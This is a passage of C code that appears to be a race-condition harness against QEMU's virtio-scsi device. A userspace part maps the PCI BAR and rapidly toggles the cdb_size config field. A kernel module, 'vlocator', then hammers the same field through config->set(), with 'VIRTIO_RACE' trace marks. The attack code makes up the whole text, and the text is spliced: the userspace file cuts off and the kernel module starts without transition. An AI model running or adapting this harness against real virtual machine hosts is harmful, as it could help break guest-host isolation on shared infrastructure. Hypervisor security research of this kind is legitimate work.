    vdev->bar_size = 4096;
    vdev->bar_base = mmap(NULL, vdev->bar_size, PROT_READ|PROT_WRITE, 
                          MAP_SHARED, fd, 0);
    close(fd);
    
    if (vdev->bar_base == MAP_FAILED) return -1;
    
    // Point to cdb_size field (offset 0x18 in virtio-scsi config)
    vdev->cdb_size_reg = (uint32_t*)((char*)vdev->bar_base + 0x18);
    return 0;
}

static void unmap_virtio_device_bar(virtio_device_t *vdev) __attribute__((unused));
static void unmap_virtio_device_bar(virtio_device_t *vdev) {
    if (vdev->bar_base != MAP_FAILED) {
        munmap(vdev->bar_base, vdev->bar_size);
        vdev->bar_base = MAP_FAILED;
    }
}

/* ---------- PCI/MMIO fallback helpers ---------- */

/* sgdev -> /sys/bus/pci/devices/<BDF> resolution. Attempts to follow the sysfs links.
   e.g., /dev/sg1 -> /sys/class/scsi_generic/sg1/device -> ../../../0000:00:04.0 */
static int sg_to_pci_dir(const char *sgdev, char *out, size_t outsz) {
    if (!sgdev || !out) return -1;
    const char *base = strrchr(sgdev, '/'); base = base ? base + 1 : sgdev;

    char link[PATH_MAX], cur[PATH_MAX];
    snprintf(link, sizeof(link), "/sys/class/scsi_generic/%s/device", base);
    if (!realpath(link, cur)) return -1;

    /* Walk up until we find a PCI function dir (has vendor+device files) */
    for (;;) {
        char vendor[PATH_MAX], device[PATH_MAX];
        snprintf(vendor, sizeof(vendor), "%s/vendor", cur);
        snprintf(device, sizeof(device), "%s/device", cur);
        if (!access(vendor, R_OK) && !access(device, R_OK)) {
            /* Extra sanity: ensure it's a PCI device (subsystem symlink ends with /pci) */
            char subs[PATH_MAX], tgt[PATH_MAX];
            snprintf(subs, sizeof(subs), "%s/subsystem", cur);
            ssize_t n = readlink(subs, tgt, sizeof(tgt)-1);
            if (n > 0) { tgt[n] = '\0'; }
            if (n > 0 && strstr(tgt, "/bus/pci")) {
                strncpy(out, cur, outsz); out[outsz-1] = '\0';
                return 0;
            }
        }
        char *slash = strrchr(cur, '/');
        if (!slash || slash == cur) break;
        *slash = '\0';
    }
    return -1;
}

/* Detect modern vs transitional virtio device by reading vendor/device IDs from sysfs */
static int is_modern_virtio(const char *pci_dir) {
    char p[PATH_MAX]; unsigned vid = 0, did = 0; FILE *f;
    snprintf(p, sizeof(p), "%s/vendor", pci_dir);
    if ((f = fopen(p, "re"))) { if (fscanf(f, "0x%x", &vid) != 1) vid = 0; fclose(f); }
    snprintf(p, sizeof(p), "%s/device", pci_dir);
    if ((f = fopen(p, "re"))) { if (fscanf(f, "0x%x", &did) != 1) did = 0; fclose(f); }
    /* Modern virtio-pci uses newer device IDs (e.g. scsi = 0x1048). Transitional devices use 0x1000-series. */
    return (vid == 0x1af4 && did >= 0x1040); /* treat >=0x1040 as modern */
}

/* Parse the PCI configuration space 'config' file to find vendor-specific virtio capability
   Returns 0 and fills hdr when found, non-zero otherwise. */
static int find_virtio_device_cfg(const char *pci_dir, struct virtio_pci_cap_hdr *hdr) {
    if (!pci_dir || !hdr) return -1;
    char cfg_path[PATH_MAX]; snprintf(cfg_path, sizeof(cfg_path), "%s/config", pci_dir);
    int fd = open(cfg_path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return -1;

    uint8_t buf[256]; ssize_t n = read(fd, buf, sizeof(buf)); close(fd);
    if (n < 0x40) return -1; /* need header + capability pointer */

    /* check Status register bit for Capabilities List (bit 4) at offset 0x06 */
    uint16_t status = (uint16_t)buf[0x06] | ((uint16_t)buf[0x07] << 8);
    if (!(status & 0x10)) return -1;

    uint8_t ptr = buf[0x34];
    fprintf(stderr, "[DEBUG] PCI config (first 256 bytes or available):\n");
    for (int i = 0; i < 256 && i < n; ++i) {
        if ((i & 0x0f) == 0) fprintf(stderr, "\n%02x:", i);
        fprintf(stderr, " %02x", buf[i]);
    }
    fprintf(stderr, "\n[DEBUG] start cap_ptr=0x%02x\n", ptr);

    /* Walk capabilities with proper bounds (avoid 8-bit n wraparound). Only treat
       byte-2 as a length for vendor-specific caps. Use visited[] and hop limit */
    size_t nbytes = (size_t)n;
    size_t iptr = (size_t)buf[0x34];
    uint8_t visited[256] = {0};
    int hop = 0;
    while (iptr && iptr + 1 < nbytes) {
        if (iptr >= 256) { fprintf(stderr, "[DEBUG] cap_ptr 0x%zx out of bounds\n", iptr); break; }
        if (visited[iptr]) { fprintf(stderr, "[DEBUG] capability list loop detected at 0x%zx\n", iptr); break; }
        visited[iptr] = 1;

        uint8_t id = buf[iptr + 0];
        uint8_t next = buf[iptr + 1];
        fprintf(stderr, "[DEBUG] cap hop=%d @0x%02zx id=0x%02x next=0x%02x\n", hop, iptr, id, next);

        /* For vendor caps, ensure full virtio header is present and parse it */
        if (id == PCI_CAP_ID_VNDR) {
            if (iptr + sizeof(struct virtio_pci_cap_hdr) <= nbytes) {
                const struct virtio_pci_cap_hdr *vh = (const void *)&buf[iptr];
                uint32_t off_le = vh->offset;
                uint32_t len_le = vh->length;
                uint32_t off = le32toh(off_le);
                uint32_t ln = le32toh(len_le);
                fprintf(stderr, "[DEBUG] vendor-cap parsed: cfg_type=%u bar=%u id=%u offset_raw=0x%08x len_raw=0x%08x -> offset=0x%08x len=0x%08x\n",
                        vh->cfg_type, vh->bar, vh->id, off_le, len_le, off, ln);
                if (vh->cfg_type == VIRTIO_PCI_CAP_DEVICE_CFG) {
                    memcpy(hdr, vh, sizeof(*hdr));
                    fprintf(stderr, "[DEBUG] found DEVICE_CFG at cap_ptr=0x%02zx (bar=%u off=0x%08x len=0x%08x)\n",
                            iptr, vh->bar, off, ln);
                    return 0;
                }
            } else {
                fprintf(stderr, "[DEBUG] vendor-cap truncated at 0x%02zx (need %zu bytes, have %zu)\n",
                        iptr, sizeof(struct virtio_pci_cap_hdr), nbytes - iptr);
                break;
            }
        }

        if (next == 0 || next == iptr) break;
        iptr = (size_t)next;
        if (++hop > 64) { fprintf(stderr, "[DEBUG] capability hops exceeded limit\n"); break; }
    }
    return -1;
}

/* Map appropriate BAR resourceN (based on hdr->bar) and flip the cdb_size field at
   (hdr->offset + VIRTIO_SCSI_CFG_CDB_SIZE_OFF) for 'flips' times. */
static int mmio_toggle_cdb_size_from_pci(const char *pci_dir, unsigned long flips, int flip_sleep_us, struct tracefs_t *tf) {
    if (!pci_dir) return -1;

    struct virtio_pci_cap_hdr vhdr;
    if (find_virtio_device_cfg(pci_dir, &vhdr) != 0) {
        if (tf && tf->available) trace_mark(tf, "VIRTIO_RACE: no DEVICE_CFG cap in %s", pci_dir);
        return -1;
    }

    /* convert LE fields to host order */
    uint32_t dev_off_raw = vhdr.offset;
    uint32_t dev_len_raw = vhdr.length;
    uint32_t dev_off = le32toh(vhdr.offset);
    uint32_t dev_len = le32toh(vhdr.length);
    int bar = vhdr.bar;

    char respath[PATH_MAX]; snprintf(respath, sizeof(respath), "%s/resource%d", pci_dir, bar);
    fprintf(stderr, "[DEBUG] attempting to open resource path %s (bar=%d)\n", respath, bar);
    int fd = open(respath, O_RDWR | O_CLOEXEC);
    if (fd < 0) { perror("[DEBUG] open resource failed"); return -1; }

    long ps = sysconf(_SC_PAGESIZE);
    if (ps <= 0) ps = 4096;

    size_t need_end = (size_t)dev_off + (size_t)VIRTIO_SCSI_CFG_CDB_SIZE_OFF + 4;
    if (dev_len > 0) need_end = (size_t)dev_off + (size_t)dev_len;

    off_t map_off = (off_t)(dev_off & ~(uint32_t)(ps - 1));
    size_t map_len = (size_t)(((need_end - (size_t)map_off) + ps - 1) & ~(ps - 1));

    fprintf(stderr, "[DEBUG] dev_off_raw=0x%08x dev_len_raw=0x%08x -> dev_off=0x%08x dev_len=0x%08x\n",
        dev_off_raw, dev_len_raw, dev_off, dev_len);
    fprintf(stderr, "[DEBUG] pagesize=%ld map_off=0x%llx map_len=%zu need_end=0x%zx cdb_field_offset=0x%zx\n",
        ps, (unsigned long long)map_off, map_len, need_end, (size_t)(dev_off + VIRTIO_SCSI_CFG_CDB_SIZE_OFF));

    void *base = mmap(NULL, map_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, map_off);
    close(fd);
    if (base == MAP_FAILED) { perror("[DEBUG] mmap failed"); return -1; }

    volatile uint32_t *cdbp = (volatile uint32_t *)((char*)base + (dev_off - (uint32_t)map_off) + VIRTIO_SCSI_CFG_CDB_SIZE_OFF);
    const uint32_t vals[2] = { 32u, 128u };

    printf("[CONFIG] MMIO: %s (BAR%d) device_cfg_off=0x%x len=0x%x mapping @0x%llx len=%zu cdb_size@0x%x\n",
           respath, bar, dev_off, dev_len, (unsigned long long)map_off, map_len, dev_off + VIRTIO_SCSI_CFG_CDB_SIZE_OFF);

    if (tf && tf->available) trace_mark(tf, "VIRTIO_RACE: mmio begin flips=%lu BAR=%d off=0x%x", flips, bar, dev_off);

    for (unsigned long i = 0; i < flips; ++i) {
        uint32_t v_native = vals[i & 1];
        uint32_t v_le = htole32(v_native);
        *cdbp = v_le; __sync_synchronize();

        /* read-back to confirm the device sees the intended native value */
        uint32_t rb_le = *cdbp;
        uint32_t rb_native = le32toh(rb_le);
        if (rb_native != v_native) {
            fprintf(stderr, "[CONFIG] MMIO: flip=%lu wrote=%u read=%u (mismatch)\n", i, v_native, rb_native);
        }

        if ((i & 4095UL) == 0 && tf && tf->available) {
            struct timespec ts; clock_gettime(CLOCK_MONOTONIC_RAW, &ts);
            unsigned long long ns = (unsigned long long)ts.tv_sec * 1000000000ull + (unsigned long long)ts.tv_nsec;
            trace_mark(tf, "VIRTIO_RACE: mmio flip=%lu value=%u t_mono_ns=%llu", i, v_native, ns);
        }
        if (flip_sleep_us > 0) usleep((useconds_t)flip_sleep_us);
    }

    if (tf && tf->available) trace_mark(tf, "VIRTIO_RACE: mmio done flips=%lu", flips);
    munmap(base, map_len);
    return 0;
}

/* ---------- CONFIG WRITER THREAD (RACE) ---------- */

/* old BAR poke writer intentionally removed in favor of safe sysfs pwrite toggler */
// vlocator.c — find "virtio1" and repeatedly write cdb_size via vdev->config->set()
#include <linux/module.h>
#include <linux/init.h>
#include <linux/pci.h>
#include <linux/device.h>
#include <linux/device/bus.h>    /* bus_find_device_by_name() */
#include <linux/virtio.h>
#include <linux/virtio_config.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sched.h>
#ifdef CONFIG_VIRTIO
#include <linux/virtio_ids.h>
#endif

#define VIRTIO_VENDOR_ID       0x1af4   /* Red Hat / Qumranet */
#define VIRTIO_SCSI_DEVICE_ID  0x1048   /* virtio-scsi-pci */
#ifndef VIRTIO_ID_SCSI
#define VIRTIO_ID_SCSI 8
#endif

#define CDB_SIZE_OFFSET 0x18     /* virtio-scsi config: cdb_size @ 0x18 */

/* module params */
static char *virtio_name = (char *)"virtio1";
module_param(virtio_name, charp, 0444);
MODULE_PARM_DESC(virtio_name, "virtio device name to locate (e.g., virtio1)");

static unsigned int cdb_value = 128;          /* value to write to cdb_size */
module_param(cdb_value, uint, 0644);
MODULE_PARM_DESC(cdb_value, "cdb_size to write (default 128)");

static unsigned int flip_iters = 10000;       /* 0 = run until module unload */
module_param(flip_iters, uint, 0644);
MODULE_PARM_DESC(flip_iters, "number of config writes (0 = infinite)");

static unsigned int flip_delay_us = 0;        /* 0 = as fast as scheduler allows */
module_param(flip_delay_us, uint, 0644);
MODULE_PARM_DESC(flip_delay_us, "delay between writes in microseconds");

static unsigned int log_every = 1000;         /* reduce spam */
module_param(log_every, uint, 0644);
MODULE_PARM_DESC(log_every, "log every N writes");

/* globals we keep while the thread runs */
static struct virtio_device *g_vdev;
static struct task_struct    *g_thr;

struct find_ctx {
    struct device *virtio_child_dev;     /* the virtio child under the PCI fn */
};

static int child_pick_virtio(struct device *child, void *data)
{
    struct find_ctx *ctx = data;

    if (child->bus && child->bus->name && strcmp(child->bus->name, "virtio") == 0) {
        pr_info("vlocator: PCI child on virtio bus: %s\n", dev_name(child));
        ctx->virtio_child_dev = child;
        return 1; /* stop */
    }
    return 0; /* continue */
}

static int cfg_flip_thread(void *arg)
{
    __le32 val_le = cpu_to_le32(cdb_value);
    unsigned long i = 0;

    pr_info("vlocator: cfg thread start: offset=0x%02x value=%u iters=%u delay_us=%u\n",
            CDB_SIZE_OFFSET, cdb_value, flip_iters, flip_delay_us);

    while (!kthread_should_stop() && (flip_iters == 0 || i < flip_iters)) {
        /*
         * Legitimate, kernel-sanctioned virtio config write.
         * This goes through the transport (virtio-pci) and into QEMU's
         * virtio_scsi_set_config() on the host.
         */
        g_vdev->config->set(g_vdev, CDB_SIZE_OFFSET, &val_le, sizeof(val_le));

        if (log_every && (i % log_every) == 0)
            pr_info("vlocator: wrote cdb_size=%u at 0x%02x (iter=%lu)\n",
                    cdb_value, CDB_SIZE_OFFSET, i);

        if (flip_delay_us)
            udelay(flip_delay_us);
        cond_resched();
        ++i;
    }

    pr_info("vlocator: cfg thread exit after %lu writes\n", i);
    return 0;
}

static int __init vlocator_init(void)
{
    struct pci_dev *pdev = NULL;
    bool any = false;

    pr_info("vlocator: searching for PCI %04x:%04x and virtio '%s'\n",
            VIRTIO_VENDOR_ID, VIRTIO_SCSI_DEVICE_ID, virtio_name);

    /* 1) Find the virtio-scsi PCI function (to discover the virtio bus) */
    for_each_pci_dev(pdev) {
        if (pdev->vendor == VIRTIO_VENDOR_ID && pdev->device == VIRTIO_SCSI_DEVICE_ID) {
            struct find_ctx ctx = { .virtio_child_dev = NULL };
            struct bus_type *vbus;
            struct device *named;
            struct virtio_device *vdev_named;

            any = true;
            pr_info("vlocator: found virtio-scsi PCI device at %s\n", pci_name(pdev));

            device_for_each_child(&pdev->dev, &ctx, child_pick_virtio);
            if (!ctx.virtio_child_dev) {
                pr_warn("vlocator: no virtio child under %s (driver not bound yet?)\n",
                        pci_name(pdev));
                continue;
            }

            /* 2) Lookup 'virtio1' by name on that bus */
            vbus = ctx.virtio_child_dev->bus;
            pr_info("vlocator: using bus '%s' to find '%s'\n", vbus->name, virtio_name);

            named = bus_find_device_by_name(vbus, NULL, virtio_name);
            if (!named) {
                pr_err("vlocator: device '%s' not found on bus '%s'\n",
                       virtio_name, vbus->name);
                continue;
            }

            /* 3) Convert to struct virtio_device* */
#ifdef dev_to_virtio
            vdev_named = dev_to_virtio(named);
#else
            vdev_named = container_of(named, struct virtio_device, dev);
#endif

            pr_info("vlocator: found by-name: dev=%s (same as PCI child? %s)\n",
                    dev_name(named),
                    (named == ctx.virtio_child_dev) ? "yes" : "no");
            pr_info("vlocator: virtio id.device=%u%s\n",
                    vdev_named->id.device,
                    (vdev_named->id.device == VIRTIO_ID_SCSI) ? " (VIRTIO_ID_SCSI)" : "");

            if (!vdev_named->config || !vdev_named->config->set) {
                pr_err("vlocator: config->set is unavailable; cannot proceed\n");
                put_device(named);
                continue;
            }

            /* 4) Hold a ref during our lifetime and spin up the writer thread */
            get_device(named);          /* take our own ref */
            g_vdev = vdev_named;

            g_thr = kthread_run(cfg_flip_thread, NULL, "vscsi_cfgflip");
            if (IS_ERR(g_thr)) {
                pr_err("vlocator: kthread_run failed: %ld\n", PTR_ERR(g_thr));
                g_thr = NULL;
                put_device(named);
                g_vdev = NULL;
                put_device(named);      /* drop lookup ref */
                continue;
            }

            put_device(named);          /* drop lookup ref; keep our ref */
            /* If you have multiple virtio-scsi functions, this will start one thread per match */
        }
    }

    if (!any) {
        pr_warn("vlocator: no PCI device %04x:%04x found\n",
                VIRTIO_VENDOR_ID, VIRTIO_SCSI_DEVICE_ID);
        return -ENODEV;
    }

    return 0;
}

static void __exit vlocator_exit(void)
{
    if (g_thr) {
        kthread_stop(g_thr);
        g_thr = NULL;
    }
    if (g_vdev) {
        put_device(&g_vdev->dev);   /* drop our ref */
        g_vdev = NULL;
    }
    pr_info("vlocator: module unloaded\n");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("you");
MODULE_DESCRIPTION("Write virtio-scsi cdb_size via virtio config->set()");
module_init(vlocator_init);
module_exit(vlocator_exit);
